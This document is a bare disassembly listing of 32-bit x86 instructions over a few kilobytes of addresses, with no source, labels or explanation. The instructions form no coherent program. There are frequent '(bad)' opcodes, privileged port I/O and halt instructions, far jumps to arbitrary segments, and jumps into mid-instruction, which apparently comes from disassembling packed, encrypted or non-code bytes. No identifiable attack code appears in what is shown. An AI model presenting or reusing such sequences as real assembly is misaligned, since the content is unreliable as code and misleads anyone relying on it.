  41ac40:	lods   eax,DWORD PTR ds:[esi]
  41ac41:	push   ebp
  41ac42:	fcomi  st,st(1)
  41ac44:	jo     0x41ac98
  41ac46:	jmp    0xcb53:0xf3a1dccb
  41ac4d:	xor    al,bh
  41ac4f:	rol    BYTE PTR [eax-0x7ed83391],cl
  41ac55:	outs   dx,DWORD PTR ds:[esi]
  41ac56:	test   BYTE PTR [eax],ch
  41ac58:	adc    bl,BYTE PTR [ebp-0x7dd218d2]
  41ac5e:	stos   BYTE PTR es:[edi],al
  41ac5f:	retf   
  41ac60:	add    eax,0x9bd7e968
  41ac65:	stc    
  41ac66:	mov    al,ds:0x108ad08b
  41ac6b:	adc    dh,BYTE PTR [ecx-0x24316ab8]
  41ac71:	dec    ebx
  41ac72:	adc    al,0xbb
  41ac74:	clc    
  41ac75:	cs jbe 0x41acac
  41ac78:	adc    dh,ch
  41ac7a:	out    dx,eax
  41ac7b:	lods   al,BYTE PTR ds:[esi]
  41ac7c:	cmp    bl,dl
  41ac7e:	pop    ds
  41ac7f:	mov    ds,WORD PTR [esi+0x7e]
  41ac82:	fucomip st,st(7)
  41ac84:	or     al,0x2d
  41ac86:	and    ch,cl
  41ac88:	mov    al,ds:0xc04f0a9a
  41ac8d:	jne    0x41ac1b
  41ac8f:	xchg   ecx,eax
  41ac90:	rcr    eax,1
  41ac92:	sbb    eax,DWORD PTR [eax]
  41ac94:	test   BYTE PTR [ebx],bl
  41ac96:	ffree  st(4)
  41ac98:	mov    bl,0xe6
  41ac9a:	imul   ebx,esp,0x5c
  41ac9d:	popf   
  41ac9e:	mov    edi,0x2e8ff58b
  41aca3:	xor    al,0xcf
  41aca5:	add    BYTE PTR [esi+0x6650fdc2],bh
  41acab:	retf   0x678e
  41acae:	(bad)  
  41acaf:	fs pop esi
  41acb1:	stos   DWORD PTR es:[edi],eax
  41acb2:	ss popf 
  41acb4:	and    esp,esi
  41acb6:	pop    ss
  41acb7:	adc    cl,al
  41acb9:	cs push 0xffffffa8
  41acbc:	push   esp
  41acbd:	ret    0x8885
  41acc0:	lds    ebx,FWORD PTR [edi]
  41acc2:	shl    esi,1
  41acc4:	lock retf 0x973c
  41acc8:	xor    al,0x7c
  41acca:	adc    eax,0xd3c735b6
  41accf:	hlt    
  41acd0:	fldcw  WORD PTR [edi-0xd]
  41acd3:	jbe    0x41acf3
  41acd5:	dec    esi
  41acd6:	sub    ch,BYTE PTR [esp+edx*1-0x7b]
  41acda:	in     eax,dx
  41acdb:	and    eax,0xf644eebc
  41ace0:	xor    eax,0x981435b6
  41ace5:	sti    
  41ace6:	push   ds
  41ace7:	or     edx,DWORD PTR [ebx+0x2]
  41acea:	mov    al,ds:0xa167b3d1
  41acef:	stos   DWORD PTR es:[edi],eax
  41acf0:	fisttp WORD PTR [eax-0x54]
  41acf3:	mov    bh,0x80
  41acf5:	(bad)  
  41acf6:	pushf  
  41acf7:	inc    edi
  41acf8:	mov    ch,0x2c
  41acfa:	xchg   ecx,eax
  41acfb:	in     al,0x39
  41acfd:	fstp   DWORD PTR [ebx]
  41acff:	les    esp,FWORD PTR [eax]
  41ad01:	int    0x18
  41ad03:	outs   dx,DWORD PTR ds:[esi]
  41ad04:	retf   
  41ad05:	mov    ecx,0xeee10b90
  41ad0a:	popa   
  41ad0b:	test   DWORD PTR [ebp+eax*4+0x10e305c9],esp
  41ad12:	pop    ds
  41ad13:	jne    0x41ad5c
  41ad15:	mov    ebx,eax
  41ad17:	fdiv   st,st(7)
  41ad19:	xor    ch,dh
  41ad1b:	call   0x31184824
  41ad20:	mov    dl,0x32
  41ad22:	pop    edi
  41ad23:	dec    ecx
  41ad24:	retf   
  41ad25:	mov    edi,0x621bf558
  41ad2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad2b:	xor    BYTE PTR [ebp-0x3b],0x88
  41ad2f:	mov    bl,0x25
  41ad31:	xchg   BYTE PTR [edi+0x1a],cl
  41ad34:	cld    
  41ad35:	sahf   
  41ad36:	hlt    
  41ad37:	clc    
  41ad38:	push   ebp
  41ad39:	shl    DWORD PTR [ebp-0x31],0x59
  41ad3d:	xchg   esi,eax
  41ad3e:	into   
  41ad3f:	sbb    esp,DWORD PTR [edi+0x37]
  41ad42:	imul   edi,DWORD PTR [edi+0x7e],0x3
  41ad46:	stc    
  41ad47:	mov    eax,ds:0xc1ed11ea
  41ad4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad4d:	mov    al,ds:0x25ffef0
  41ad52:	xchg   DWORD PTR [esi-0x31],esp
  41ad55:	das    
  41ad56:	or     DWORD PTR [ebp-0x3d0651ff],ebp
  41ad5c:	or     BYTE PTR [esp+edi*4],ah
  41ad5f:	jnp    0x41ad7b
  41ad61:	daa    
  41ad62:	retf   0x2a53
  41ad65:	inc    ebx
  41ad66:	xor    DWORD PTR [ecx],ebp
  41ad68:	dec    edi
  41ad69:	rcl    BYTE PTR [ecx],1
  41ad6b:	cmp    DWORD PTR [edx+ebp*1-0x43],ebx
  41ad6f:	retf   0xb6ed
  41ad72:	je     0x41ad4b
  41ad74:	cmp    BYTE PTR [eax-0x1b],ah
  41ad77:	sbb    al,0xb1
  41ad79:	and    ebx,DWORD PTR [edi]
  41ad7b:	dec    ebx
  41ad7c:	sub    esp,DWORD PTR [edx-0x73ec0aa3]
  41ad82:	sub    ecx,DWORD PTR [edx-0x45]
  41ad85:	(bad)  
  41ad86:	stos   DWORD PTR es:[edi],eax
  41ad87:	fwait
  41ad88:	cmp    edi,edx
  41ad8a:	(bad)  [esi]
  41ad8c:	and    DWORD PTR [eax+0x51],0xdde6f84b
  41ad93:	sub    al,0x66
  41ad95:	sbb    eax,0x38828091
  41ad9a:	jbe    0x41ad6d
  41ad9c:	mov    cs,WORD PTR [edi]
  41ad9e:	or     eax,0x87917a57
  41ada3:	into   
  41ada4:	add    al,0x5d
  41ada6:	fsubrp st(3),st
  41ada8:	enter  0x83d6,0xf7
  41adac:	mov    eax,ds:0xa3a63cbc
  41adb1:	scas   eax,DWORD PTR es:[edi]
  41adb2:	xor    DWORD PTR [ecx+0xf],ebx
  41adb5:	sbb    bl,cl
  41adb7:	push   cs
  41adb8:	loop   0x41ae1d
  41adba:	adc    al,BYTE PTR [ebp-0x3a09990c]
  41adc0:	xchg   esi,eax
  41adc1:	pop    ss
  41adc2:	in     al,dx
  41adc3:	test   al,0x14
  41adc5:	test   al,0x73
  41adc7:	xor    eax,0x35bfc7c7
  41adcc:	out    0x4,eax
  41adce:	stc    
  41adcf:	jb     0x41add7
  41add1:	cs pop ds
  41add3:	loop   0x41ae49
  41add5:	jecxz  0x41adc8
  41add7:	xchg   esi,eax
  41add8:	fcom   DWORD PTR [eax]
  41adda:	imul   ecx,DWORD PTR [ebx-0x65],0xffffffc5
  41adde:	cmc    
  41addf:	jg     0x41ae03
  41ade1:	xor    dh,al
  41ade3:	xlat   BYTE PTR ds:[ebx]
  41ade4:	leave  
  41ade5:	out    dx,al
  41ade6:	lods   eax,DWORD PTR ds:[esi]
  41ade7:	out    dx,al
  41ade8:	lods   al,BYTE PTR ds:[esi]
  41ade9:	sahf   
  41adea:	add    al,0xfa
  41adec:	cli    
  41aded:	inc    edi
  41adee:	inc    ebx
  41adef:	out    0xf9,al
  41adf1:	xchg   ebp,eax
  41adf2:	inc    ebx
  41adf3:	jns    0x41ad85
  41adf5:	jbe    0x41ae37
  41adf7:	and    edi,DWORD PTR [edi-0x41]
  41adfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adfb:	push   ebx
  41adfc:	in     al,0x2
  41adfe:	add    BYTE PTR [edx-0xe],cl
  41ae01:	fnstsw WORD PTR [esi-0x55]
  41ae04:	shr    cl,cl
  41ae06:	retf   0x2e8c
  41ae09:	mov    eax,ds:0x3121beee
  41ae0e:	push   0xffffffb9
  41ae10:	sahf   
  41ae11:	fsub   QWORD PTR ds:0xeae1e2e8
  41ae17:	cli    
  41ae18:	mov    BYTE PTR [ecx],cl
  41ae1a:	xchg   ebx,eax
  41ae1b:	adc    al,0x7f
  41ae1d:	imul   ecx,DWORD PTR [edx],0x10
  41ae20:	xchg   BYTE PTR [edi],al
  41ae22:	ins    DWORD PTR es:[edi],dx
  41ae23:	(bad)  
  41ae25:	out    dx,eax
  41ae26:	(bad)
  41ae29:	shr    BYTE PTR [ebx-0x540d02d3],0x18
  41ae30:	or     ah,BYTE PTR [edi]
  41ae32:	pusha  
  41ae33:	and    eax,0xe053b382
  41ae38:	sub    bh,ah
  41ae3a:	sub    esp,esp
  41ae3c:	jae    0x41ae4a
  41ae3e:	jge    0x41ae59
  41ae40:	loop   0x41ae29
  41ae42:	xor    esi,esp
  41ae44:	mov    ah,0x3
  41ae46:	cmp    edx,eax
  41ae48:	add    BYTE PTR [ebx],0xb4
  41ae4b:	jp     0x41ae22
  41ae4d:	call   0x46ce:0xc3a3f11c
  41ae54:	loop   0x41ae65
  41ae56:	sub    eax,0x7dee73fd
  41ae5b:	mov    edx,0x65a3d05
  41ae60:	test   ch,cl
  41ae62:	pop    ebx
  41ae63:	pop    es
  41ae64:	fcomp  DWORD PTR [ebp-0x77]
  41ae67:	hlt    
  41ae68:	cmp    BYTE PTR [ebp-0x49],dl
  41ae6b:	mov    eax,0x814bae23
  41ae70:	retf   0xa9a9
  41ae73:	rcr    DWORD PTR [ecx+0xd50cd39],cl
  41ae79:	outs   dx,BYTE PTR ds:[esi]
  41ae7a:	cs scas al,BYTE PTR es:[edi]
  41ae7c:	xchg   esp,eax
  41ae7d:	vaddsubpd ymm4,ymm3,ymm5
  41ae81:	ret    
  41ae82:	rcl    DWORD PTR [esi],1
  41ae84:	popa   
  41ae85:	mov    esp,0xfe338d00
  41ae8a:	adc    ah,BYTE PTR [eax-0x42c229c9]
  41ae90:	loop   0x41ae9c
  41ae92:	fwait
  41ae93:	dec    edx
  41ae94:	dec    edi
  41ae95:	and    BYTE PTR [ecx-0x6a3774ee],0x1d
  41ae9c:	dec    esp
  41ae9d:	or     BYTE PTR [ebx-0x38152b4d],0xc3
  41aea4:	les    ebx,FWORD PTR [eax-0x8]
  41aea7:	not    eax
  41aea9:	loopne 0x41af07
  41aeab:	dec    edi
  41aeac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aead:	retf   0x9daf
  41aeb0:	mov    eax,0xf6b15bf4
  41aeb5:	mov    edi,0x7bce7173
  41aeba:	mov    eax,es
  41aebc:	sar    DWORD PTR [edx+0x30],1
  41aebf:	arpl   WORD PTR [ebp+0x3907ab81],si
  41aec5:	jl     0x41ae5a
  41aec7:	scas   eax,DWORD PTR es:[edi]
  41aec8:	push   eax
  41aec9:	std    
  41aeca:	loope  0x41af49
  41aecc:	xor    eax,0xa34ae2e9
  41aed1:	loope  0x41af0a
  41aed3:	sub    DWORD PTR [ebx-0xc739c3c],ebp
  41aed9:	or     BYTE PTR ds:0xd1781f72,dl
  41aedf:	push   cs
  41aee0:	test   dl,ch
  41aee2:	adc    BYTE PTR [esi],0x85
  41aee5:	lods   al,BYTE PTR ds:[esi]
  41aee6:	jbe    0x41af12
  41aee8:	push   ss
  41aee9:	lea    esi,[edi+0x58]
  41aeec:	lods   eax,DWORD PTR ds:[esi]
  41aeed:	mov    eax,0xa51590b3
  41aef2:	jb     0x41af6f
  41aef4:	stos   DWORD PTR es:[edi],eax
  41aef5:	push   esp
  41aef6:	imul   ecx,DWORD PTR [eax+0x3a],0xaf81662e
  41aefd:	ss ss inc edx
  41af00:	lds    ecx,FWORD PTR [ecx-0x2c]
  41af03:	xlat   BYTE PTR ds:[ebx]
  41af04:	mov    al,bh
  41af06:	fdivr  QWORD PTR [edx-0x78c268c5]
  41af0c:	xchg   edi,eax
  41af0d:	jbe    0x41af57
  41af0f:	cmp    dh,ch
  41af11:	retf   
  41af12:	add    BYTE PTR [esi],ah
  41af14:	dec    eax
  41af15:	pusha  
  41af16:	loop   0x41aee1
  41af18:	outs   dx,BYTE PTR ds:[esi]
  41af19:	pop    esp
  41af1a:	add    dh,BYTE PTR [edi+0x7be919c7]
  41af20:	push   ecx
  41af21:	arpl   ax,bp
  41af23:	clc    
  41af24:	push   ss
  41af25:	int3   
  41af26:	push   0x5d
  41af28:	stos   BYTE PTR es:[edi],al
  41af29:	retf   0x69b2
  41af2c:	scas   eax,DWORD PTR es:[edi]
  41af2d:	xlat   BYTE PTR ds:[ebx]
  41af2e:	sub    eax,DWORD PTR [eax+0x43e567eb]
  41af34:	or     BYTE PTR [ecx],dl
  41af36:	rcl    edx,cl
  41af38:	scas   al,BYTE PTR es:[edi]
  41af39:	pop    ecx
  41af3a:	push   0x8f3233f2
  41af3f:	mov    ds:0x2f7c8e5d,eax
  41af44:	rol    DWORD PTR [eax+0x13],1
  41af47:	aas    
  41af48:	scas   eax,DWORD PTR es:[edi]
  41af49:	jns    0x41af84
  41af4b:	push   esi
  41af4c:	push   0x1f33cae4
  41af51:	jns    0x41af4e
  41af53:	cmp    al,0x99
  41af55:	pusha  
  41af56:	jae    0x41af0a
  41af58:	dec    edx
  41af59:	cmp    al,0x51
  41af5b:	popa   
  41af5c:	mov    ah,0x44
  41af5e:	ret    
  41af5f:	sub    DWORD PTR [ecx],0x688375bd
  41af65:	sar    ch,1
  41af67:	pop    esi
  41af68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af69:	jg     0x41afcd
  41af6b:	retf   
  41af6c:	and    bh,BYTE PTR [ecx]
  41af6e:	mov    bh,0xdc
  41af70:	add    ch,BYTE PTR [edi]
  41af72:	jge    0x41af6e
  41af74:	es pop es
  41af76:	stc    
  41af77:	and    al,0x5
  41af79:	mov    esp,0x6ba09a1e
  41af7e:	add    BYTE PTR [ecx-0x6e],dh
  41af81:	add    ch,BYTE PTR [ecx-0x52]
  41af84:	push   cs
  41af85:	sub    DWORD PTR [ecx],0x6b
  41af88:	add    al,0xf3
  41af8a:	sti    
  41af8b:	and    al,0xef
  41af8d:	jp     0x41af3e
  41af8f:	dec    edi
  41af90:	popa   
  41af91:	xchg   esp,eax
  41af92:	out    dx,eax
  41af93:	(bad)  
  41af94:	(bad)  
  41af95:	cmp    al,0x20
  41af97:	pop    edi
  41af98:	jne    0x41afd4
  41af9a:	ins    BYTE PTR es:[edi],dx
  41af9b:	jnp    0x41af46
  41af9d:	sbb    DWORD PTR [ecx],0xffffff98
  41afa0:	jge    0x41b020
  41afa2:	je     0x41afb0
  41afa4:	mov    WORD PTR [ecx+eax*4],ss
  41afa7:	push   cs
  41afa8:	or     DWORD PTR [eax],edx
  41afaa:	push   ebx
  41afab:	inc    ebx
  41afac:	add    ebx,DWORD PTR [ebx+0x395996]
  41afb2:	inc    esp
  41afb3:	dec    ebp
  41afb4:	mov    edx,0x7343809e
  41afb9:	imul   esi,DWORD PTR [ebx],0xffffffb5
  41afbc:	sub    BYTE PTR [eax-0x4a],ch
  41afbf:	pop    eax
  41afc0:	aaa    
  41afc1:	in     al,0xb1
  41afc3:	xor    al,0x9
  41afc5:	pop    edx
  41afc6:	jae    0x41affb
  41afc8:	popf   
  41afc9:	hlt    
  41afca:	loop   0x41b03b
  41afcc:	scas   eax,DWORD PTR es:[edi]
  41afcd:	std    
  41afce:	mov    ebx,0x7ec262c4
  41afd3:	ror    BYTE PTR [edi-0x38f4f46d],1
  41afd9:	jae    0x41af73
  41afdb:	imul   esi,eax,0xffffff8b
  41afde:	ret    
  41afdf:	clc    
  41afe0:	adc    DWORD PTR [esi+eiz*1],ebx
  41afe3:	cdq    
  41afe4:	rcl    BYTE PTR [ebp+0x47177560],0x46
  41afeb:	pop    eax
  41afec:	ins    DWORD PTR es:[edi],dx
  41afed:	jb     0x41b02b
  41afef:	mov    ds:0xa23da5c3,eax
  41aff4:	lods   al,BYTE PTR ds:[esi]
  41aff5:	sub    edx,DWORD PTR [esi]
  41aff7:	push   0x4173a88a
  41affc:	pushf  
  41affd:	mov    bl,0x71
  41afff:	jg     0x41b013
  41b001:	rcl    DWORD PTR [eax-0x47],0x76
  41b005:	mov    ebp,0x5d117f42
  41b00a:	sub    BYTE PTR [ebp-0x58],bh
  41b00d:	dec    esp
  41b00e:	imul   esi,ebp,0xffffff90
  41b011:	pop    es
  41b012:	mov    ebp,0x4a30470c
  41b017:	les    eax,FWORD PTR [esi]
  41b019:	mov    ds:0xbf27811e,eax
  41b01e:	fisttp WORD PTR [eax]
  41b020:	hlt    
  41b021:	fidivr WORD PTR [edi+0x5f2972f4]
  41b027:	je     0x41b094
  41b029:	xchg   ebp,eax
  41b02a:	rcr    edi,0xa8
  41b02d:	ret    
  41b02e:	mov    ah,0x35
  41b030:	iret   
  41b031:	enter  0xac9f,0x65
  41b035:	popf   
  41b036:	and    ebp,ebx
  41b038:	int3   
  41b039:	cdq    
  41b03a:	mov    dh,0xdb
  41b03c:	add    al,0x31
  41b03e:	add    eax,0xb7e94ef3
  41b043:	fidiv  DWORD PTR [esi-0x11]
  41b046:	push   0x79
  41b048:	xchg   bl,ah
  41b04a:	push   0x35
  41b04c:	rol    DWORD PTR [ebx+0x306e9dde],cl
  41b052:	mov    edx,0x59c259b6
  41b057:	fmul   QWORD PTR [ecx-0x527b5e74]
  41b05d:	xchg   edi,eax
  41b05e:	and    ebx,DWORD PTR [esi-0x5a]
  41b061:	dec    edx
  41b062:	push   edi
  41b063:	sub    edx,DWORD PTR [ecx+0x6cba06f2]
  41b069:	fs push edi
  41b06b:	jne    0x41b0c3
  41b06d:	mov    DWORD PTR [esi+0x13],ecx
  41b070:	shl    DWORD PTR ds:0xa3e6fb3b,0xc0
  41b077:	lea    esi,[ebx-0x776161f2]
  41b07d:	mov    eax,gs:0x5ac381c3
  41b083:	cli    
  41b084:	nop
  41b085:	jmp    0x45e03fb4
  41b08a:	mov    ds:0x1262d932,eax
  41b08f:	xor    al,0x8
  41b091:	mov    dl,0x74
  41b093:	mov    edx,0x8bd1afa7
  41b098:	push   0xd09a7da4
  41b09d:	fnstenv [edx-0x1d]
  41b0a0:	adc    esp,DWORD PTR [esi+0x7]
  41b0a3:	mov    DWORD PTR [esi],ecx
  41b0a5:	xlat   BYTE PTR ds:[ebx]
  41b0a6:	dec    ebx
  41b0a7:	in     al,dx
  41b0a8:	jb     0x41b11a
  41b0aa:	adc    BYTE PTR [ebx+0x4d],al
  41b0ad:	(bad)  
  41b0ae:	rcr    BYTE PTR [ecx+0x70823226],1
  41b0b4:	pop    ss
  41b0b5:	jl     0x41b0ae
  41b0b7:	out    0x58,eax
  41b0b9:	and    DWORD PTR [ecx],0x8
  41b0bc:	ds hlt 
  41b0be:	push   ss
  41b0bf:	call   DWORD PTR [edi+edx*4]
  41b0c2:	imul   eax,DWORD PTR [eax-0x5e],0x42377d3
  41b0c9:	loopne 0x41b104
  41b0cb:	add    bl,dl
  41b0cd:	shl    bl,1
  41b0cf:	xlat   BYTE PTR ds:[ebx]
  41b0d0:	daa    
  41b0d1:	loope  0x41b102
  41b0d3:	fcom   QWORD PTR [ecx+0x162e27d7]
  41b0d9:	(bad)
  41b0dd:	out    dx,al
  41b0de:	push   esi
  41b0df:	pop    edx
  41b0e0:	shr    DWORD PTR ds:0x83b58d23,cl
  41b0e6:	push   edx
  41b0e7:	xor    BYTE PTR [esi],ch
  41b0e9:	outs   dx,BYTE PTR ds:[esi]
  41b0ea:	push   0x55
  41b0ec:	add    eax,DWORD PTR [edi+edx*1-0x4c370a16]
  41b0f3:	popf   
  41b0f4:	jno    0x41b0b4
  41b0f6:	xor    ah,BYTE PTR [edi]
  41b0f8:	sub    eax,0x1fbe802e
  41b0fd:	push   ss
  41b0fe:	in     al,0x3b
  41b100:	pop    esp
  41b101:	adc    BYTE PTR [ebp+0x5301f96],cl
  41b107:	fist   DWORD PTR [ecx]
  41b109:	out    0x8e,eax
  41b10b:	push   ss
  41b10c:	mov    esi,0xfb5fbbd4
  41b111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b112:	jl     0x41b12d
  41b114:	inc    ebp
  41b115:	push   ss
  41b116:	(bad)  
  41b118:	outs   dx,BYTE PTR ds:[esi]
  41b119:	lds    esi,FWORD PTR [eax-0x339e8e67]
  41b11f:	inc    ebx
  41b120:	fwait
  41b121:	mov    eax,0xb2bb309c
  41b126:	ror    BYTE PTR [ebp-0x58ff89f5],cl
  41b12c:	mov    ds:0x2a036e7f,eax
  41b131:	mov    esp,0x1f2c589c
  41b136:	std    
  41b137:	icebp  
  41b138:	lods   eax,DWORD PTR ds:[esi]
  41b139:	mov    cl,0x54
  41b13b:	dec    ebx
  41b13c:	es std 
  41b13e:	sub    eax,0xaca7a57b
  41b143:	mov    ah,0x82
  41b145:	mov    esi,0xe39d1659
  41b14a:	sti    
  41b14b:	sbb    edi,DWORD PTR [ebx+0x65]
  41b14e:	pop    ds
  41b14f:	sahf   
  41b150:	dec    esi
  41b151:	(bad)  
  41b152:	ja     0x41b139
  41b154:	mov    cl,0xc3
  41b156:	(bad)  
  41b157:	in     al,dx
  41b158:	test   BYTE PTR [edi+ebp*4],ah
  41b15b:	cli    
  41b15c:	imul   edx,DWORD PTR [edi-0x57],0x3ab2e18
  41b163:	scas   al,BYTE PTR es:[edi]
  41b164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b165:	add    al,0xc2
  41b167:	ins    BYTE PTR es:[edi],dx
  41b168:	push   ecx
  41b169:	xor    eax,DWORD PTR [ecx-0x408634fa]
  41b16f:	jb     0x41b1c0
  41b171:	imul   ecx,DWORD PTR [esi-0x17],0xffffff99
  41b175:	push   ebx
  41b176:	cmp    BYTE PTR [ebx+0x34],ch
  41b179:	cli    
  41b17a:	(bad)  [edx+eiz*8]
  41b17d:	push   esi
  41b17e:	mov    dh,0xf4
  41b180:	inc    edx
  41b181:	(bad)  
  41b182:	and    BYTE PTR [edx-0x61],dh
  41b185:	ss mov edi,0x5eb2ffd8
  41b18b:	(bad)  
  41b18c:	test   eax,0x90de91f7
  41b191:	dec    ecx
  41b192:	sbb    al,0x4a
  41b194:	data16 (bad) 
  41b196:	xlat   BYTE PTR ds:[ebx]
  41b197:	out    0xd0,eax
  41b199:	sbb    DWORD PTR [ebp-0x75ab6b94],0xde6c803
  41b1a3:	add    al,0xd9
  41b1a5:	test   al,0xd7
  41b1a7:	outs   dx,BYTE PTR ds:[esi]
  41b1a8:	xchg   esp,eax
  41b1a9:	ins    DWORD PTR es:[edi],dx
  41b1aa:	std    
  41b1ab:	popa   
  41b1ac:	xchg   ecx,eax
  41b1ad:	xor    DWORD PTR [esi],ebx
  41b1af:	fbstp  TBYTE PTR [ebp-0x3d52492b]
  41b1b5:	out    dx,al
  41b1b6:	pop    eax
  41b1b7:	ret    
  41b1b8:	int3   
  41b1b9:	out    dx,eax
  41b1ba:	sbb    al,0x1c
  41b1bc:	ficomp WORD PTR [edx+0x4d38c1e2]
  41b1c2:	cwde   
  41b1c3:	adc    al,0x96
  41b1c5:	push   ds
  41b1c6:	cmp    eax,0xc0c176a8
  41b1cb:	in     eax,dx
  41b1cc:	inc    ecx
  41b1cd:	inc    edi
  41b1ce:	cmc    
  41b1cf:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41b1d1:	loopne 0x41b1ec
  41b1d3:	xchg   edx,eax
  41b1d4:	ins    BYTE PTR es:[edi],dx
  41b1d5:	sbb    eax,0x44fe6971
  41b1da:	jp     0x41b1be
  41b1dc:	adc    ch,dl
  41b1de:	xchg   ecx,eax
  41b1df:	(bad)  
  41b1e0:	or     DWORD PTR [edx],ebx
  41b1e2:	fcmovnbe st,st(6)
  41b1e4:	fadd   QWORD PTR [esi-0x16]
  41b1e7:	and    ch,dh
  41b1e9:	and    ebx,DWORD PTR ds:0x8f17c718
  41b1ef:	cdq    
  41b1f0:	daa    
  41b1f1:	sbb    ecx,DWORD PTR [ecx-0x6e]
  41b1f4:	mov    ebx,0xbc40279b
  41b1f9:	jge    0x41b223
  41b1fb:	pusha  
  41b1fc:	outs   dx,BYTE PTR ds:[esi]
  41b1fd:	and    DWORD PTR [edx],0x8246b049
  41b203:	xor    eax,DWORD PTR [eax-0x675cf8c6]
  41b209:	dec    edi
  41b20a:	(bad)  
  41b20b:	xchg   esi,eax
  41b20c:	arpl   WORD PTR [ecx],si
  41b20e:	pop    ebx
  41b20f:	jne    0x41b26e
  41b211:	adc    edx,edx
  41b213:	sbb    bh,BYTE PTR [eax-0x108b1cef]
  41b219:	out    0xcd,al
  41b21b:	dec    esp
  41b21c:	push   0x19
  41b21e:	out    dx,eax
  41b21f:	sub    eax,0x327bdd32
  41b224:	jb     0x41b1ff
  41b226:	call   0xac98d6
  41b22b:	and    BYTE PTR [ebx+0xf759909],cl
  41b231:	dec    edi
  41b232:	arpl   WORD PTR [edi-0x1fb68348],dx
  41b238:	ja     0x41b238
  41b23a:	ss pop esp
  41b23c:	lods   al,BYTE PTR ds:[esi]
  41b23d:	adc    ch,BYTE PTR [ebx-0x48a91b2e]
  41b243:	and    bh,BYTE PTR [ecx+esi*2]
  41b246:	jmp    0x41b26b
  41b248:	clc    
  41b249:	sahf   
  41b24a:	mov    esp,0x41601708
  41b24f:	aas    
  41b250:	iret   
  41b251:	data16 (bad) 
  41b253:	pop    edi
  41b254:	xor    ebx,esi
  41b256:	xor    eax,0x6e142471
  41b25b:	push   ebp
  41b25c:	ret    
  41b25d:	fsub   st(4),st
  41b25f:	pop    esi
  41b260:	and    al,BYTE PTR [edi+0x5a668e79]
  41b266:	mov    ds:0xb08657a,eax
  41b26b:	(bad)  
  41b26c:	sub    bh,BYTE PTR [ebp+ecx*1+0x7ce9aaf7]
  41b273:	dec    esp
  41b274:	pop    edi
  41b275:	sub    ah,dl
  41b277:	(bad)
  41b27a:	or     DWORD PTR [eax+0x7a1f601b],0x64
  41b281:	ret    
  41b282:	mov    bh,0x0
  41b284:	ficom  WORD PTR [edx+0x2e2421ac]
  41b28a:	shl    BYTE PTR [edi],1
  41b28c:	pop    edi
  41b28d:	in     eax,0xde
  41b28f:	adc    ebp,DWORD PTR [edi-0x73dd30f3]
  41b295:	rcl    bl,cl
  41b297:	cmp    eax,0x7c94bb23
  41b29c:	retf   0x6d95
  41b29f:	push   0xe9e4775b
  41b2a4:	lds    eax,FWORD PTR [ebx]
  41b2a6:	sub    DWORD PTR [edi],edi
  41b2a8:	or     eax,0x9158268b
  41b2ad:	int3   
  41b2ae:	lock mov eax,0xe6178ce1
  41b2b4:	pop    esp
  41b2b5:	out    0x95,eax
  41b2b7:	adc    DWORD PTR [ecx-0x5e81dcac],eax
  41b2bd:	rcr    DWORD PTR [eax-0x152a47c3],0xf0
  41b2c4:	dec    edi
  41b2c5:	repz shl al,cl
  41b2c8:	push   eax
  41b2c9:	inc    ebx
  41b2ca:	scas   eax,DWORD PTR es:[edi]
  41b2cb:	fdivr  DWORD PTR [edx]
  41b2cd:	dec    eax
  41b2ce:	test   BYTE PTR [esp+esi*2+0x17],cl
  41b2d2:	inc    ecx
  41b2d3:	mov    ds:0x3e51523d,eax
  41b2d8:	mov    ds:0xf5e9d440,eax
  41b2dd:	xchg   edx,eax
  41b2de:	sbb    eax,0x69d2f071
  41b2e3:	fcom   DWORD PTR [ebp+0x716316e3]
  41b2e9:	bound  ecx,QWORD PTR ds:0x33508802
  41b2ef:	std    
  41b2f0:	dec    esi
  41b2f1:	ins    BYTE PTR es:[edi],dx
  41b2f2:	mov    bl,0xa4
  41b2f4:	retf   
  41b2f5:	xor    DWORD PTR [esi+ecx*4+0x7d],ebp
  41b2f9:	push   edi
  41b2fa:	adc    DWORD PTR [eax],eax
  41b2fc:	aad    0x9
  41b2fe:	dec    eax
  41b2ff:	mov    dh,0x88
  41b301:	push   ds
  41b302:	mov    cl,0x4a
  41b304:	daa    
  41b305:	popf   
  41b306:	mov    ebp,0xd312722c
  41b30b:	repz in eax,dx
  41b30d:	test   eax,0xf4b4853a
  41b312:	mov    fs,WORD PTR [esi+esi*1-0x35]
  41b316:	les    ecx,FWORD PTR [ebx]
  41b318:	xchg   BYTE PTR [esi+0x1b8d5081],bh
  41b31e:	out    0x86,eax
  41b320:	cmp    dh,BYTE PTR [eax-0x7c]
  41b323:	xchg   ecx,eax
  41b324:	adc    DWORD PTR [edi+0x2d],0xed3d5b56
  41b32b:	jae    0x41b2b3
  41b32d:	call   FWORD PTR [edi]
  41b32f:	ds call 0x4348:0x64a6e0a
  41b337:	in     eax,0xc3
  41b339:	outs   dx,BYTE PTR cs:[esi]
  41b33b:	ins    BYTE PTR es:[edi],dx
  41b33c:	sub    eax,0xeee945a
  41b341:	cli    
  41b342:	in     eax,0x8e
  41b344:	in     al,0xe2
  41b346:	(bad)  
  41b347:	lea    ecx,[ebx]
  41b349:	int    0xdb
  41b34b:	stos   BYTE PTR es:[edi],al
  41b34c:	(bad)  
  41b34d:	xor    edi,DWORD PTR [ecx-0x69]
  41b350:	inc    ebx
  41b351:	or     eax,0xbdfc6fd0
  41b356:	add    ah,BYTE PTR [ebx+0x6c968217]
  41b35c:	or     BYTE PTR [edx-0x73],ah
  41b35f:	lods   eax,DWORD PTR ds:[esi]
  41b360:	cmp    eax,0xc4ea969b
  41b365:	push   cs
  41b366:	push   ebx
  41b367:	lock ins DWORD PTR es:[edi],dx
  41b369:	jmp    0x41b341
  41b36b:	mov    edx,0x2697db96
  41b370:	cwde   
  41b371:	bnd jno 0x41b352
  41b374:	rol    BYTE PTR ds:0xb04f1371,cl
  41b37a:	in     al,dx
  41b37b:	xor    DWORD PTR [eax+0x5d042eda],0xedf44bb9
  41b385:	pop    ebp
  41b386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b387:	cld    
  41b388:	jge    0x41b3bb
  41b38a:	pop    ebp
